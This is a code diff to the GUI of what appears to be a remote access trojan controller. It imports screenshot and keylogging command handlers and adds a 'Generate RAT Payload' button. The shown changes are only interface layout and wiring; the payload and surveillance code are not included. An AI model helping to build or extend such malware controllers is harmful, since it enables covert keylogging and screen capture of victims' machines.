@@ -34,7 +34,7 @@ from customtkinter import (
 from CTkToolTip import CTkToolTip
 from PIL import Image
 # Modules.
-from .buttons import DefaultButton, ListButton
+from .buttons import DefaultButton, DefaultButtonThin, ListButton
 from ..commands.host import (
     btn_send_command_screenshot,
     btn_send_command_keylog,
@@ -50,6 +50,7 @@ from ..commands.net import (
     btn_disconnect,
     btn_ping,
 )
+from ..commands.misc import btn_generate_payload
 
 class TopLeftFrame(CTkFrame):
     """_summary_
@@ -702,6 +703,7 @@ class BottomInterfaceFrame(CTkFrame):
     def __init__(
         self: object,
         master: Any,
+        assets_dir: Path,
         **kwargs: Dict[Any, Any]
     ) -> None:
         """_summary_
@@ -712,11 +714,39 @@ class BottomInterfaceFrame(CTkFrame):
 
         super().__init__(master, **kwargs)
 
+        # Configure grid system - 2 columns,
+        # 1 row.
+        self.grid_rowconfigure(0, weight=0)
+        self.grid_columnconfigure((0, 1), weight=1)
+
         # Interface drop-down.
         self._interface_option: Union[None, CTkOptionMenu] = None
 
+        # Widgets.
+        self.option_tooltip: Union[None, CTkToolTip] = None
+        self.btn_1: Union[None, CTkButton] = None
+        self._download_img_path: Union[None, CTkImage] = None
+
+        # Comprises Path to assets directory.
+        self._assets_dir = assets_dir
+
+        self._create_icon()
         self._create_widgets()
         self._position_widgets()
+
+    def _create_icon(self: object) -> None:
+        """_summary_
+
+        Args:
+            self (object): _description_
+        """
+
+        self._download_img_path = CTkImage(
+            dark_image=Image.open(
+                str(self._assets_dir) + '/download_img.png'
+            ),
+            size=(13, 15)
+        )
 
     def _create_widgets(self: object) -> None:
         """_summary_
@@ -734,6 +764,21 @@ class BottomInterfaceFrame(CTkFrame):
             message="Select Network Interface"
         )
 
+        self.btn_1 = DefaultButtonThin(
+            self,
+            state='normal',
+            image=self._download_img_path,
+            command=partial(
+                btn_generate_payload,
+                self.winfo_toplevel()
+            )
+        )
+
+        self.btn_1_tooltip = CTkToolTip(
+            self.btn_1,
+            message="Generate RAT Payload"
+        )
+
     def _position_widgets(self: object) -> None:
         """_summary_
 
@@ -741,4 +786,5 @@ class BottomInterfaceFrame(CTkFrame):
             self (object): _description_
         """
 
-        self.interface_option.grid(row=0, column=0)
+        self.interface_option.grid(sticky='W', row=0, column=0)
+        self.btn_1.grid(sticky='E', row=0, column=1)
